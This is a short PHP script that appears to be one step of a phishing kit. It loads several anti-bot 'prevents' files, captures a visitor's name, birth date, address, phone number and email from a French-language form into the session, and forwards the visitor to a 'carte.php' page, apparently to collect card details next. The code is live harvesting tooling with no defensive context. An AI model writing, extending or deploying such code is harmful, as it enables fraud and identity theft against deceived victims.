<?php
include ("../ab.php");
include ("../prevents/anti1.php");
include ("../prevents/anti2.php");
include ("../prevents/anti3.php");
include ("../prevents/anti4.php");
include ("../prevents/anti5.php");
include('./settings.php');
include('./get_browser.php');
include('./get_ip.php');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
if(!isset($_POST['numero_telephone']) || !isset($_POST['full_name']) || !isset($_POST['adresse']) || !isset($_POST['zip']) || !isset($_POST['ville']) || !isset($_POST['numero_telephone']) || !isset($_POST['email']))
{
    header('location: ../index.php?invalid=champs');
    return;
}
$_SESSION['msg'] = [];

$_SESSION['4phone'] = substr($_POST['numero_telephone'], 1, 5);
$_SESSION['phone'] = $_POST['numero_telephone'];

$_SESSION['full_name'] = $_POST['full_name'];
$_SESSION['D-D-N'] = $_POST['date_naissance'];
$_SESSION['adresse'] = $_POST['adresse'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['ville'] = $_POST['ville'];
$_SESSION['phone_number'] = $_POST['numero_telephone'];
$_SESSION['email'] = $_POST['email'];

header('Location: ../carte.php');
?>